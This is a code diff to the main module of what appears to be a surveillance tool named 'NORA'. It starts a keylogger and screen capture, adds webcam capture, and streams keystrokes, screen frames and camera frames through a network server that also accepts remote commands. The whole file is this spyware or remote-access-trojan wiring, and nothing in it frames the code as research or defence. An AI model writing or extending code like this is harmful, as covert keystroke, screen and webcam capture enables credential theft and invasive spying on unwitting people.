@@ -1,33 +1,26 @@
-import threading
 import os
+import threading
 
 import server
 import keylogger as kl
 import screencap as sc
 import controller
 import recorder as rec
+import camera as cam
 
 PORT = int(os.environ.get("NORA_PORT", 9090))
-
-_key_lock = threading.Lock()
-
-
-def on_key(char):
-    server.broadcast_key(char)
-
-
-def on_frame(b64):
-    server.broadcast_frame(b64)
 
 
 def main():
     recorder = rec.Recorder(output_dir="recordings", fps=10)
-    server.init(controller.handle_command, recorder)
+    camera = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)
 
-    keylogger = kl.Keylogger(on_key)
+    server.init(controller.handle_command, recorder, camera)
+
+    keylogger = kl.Keylogger(server.broadcast_key)
     keylogger.start()
 
-    capture = sc.ScreenCapture(on_frame, fps=12, quality=55, scale=0.6)
+    capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
     capture.attach_recorder(recorder)
     capture.start()
 
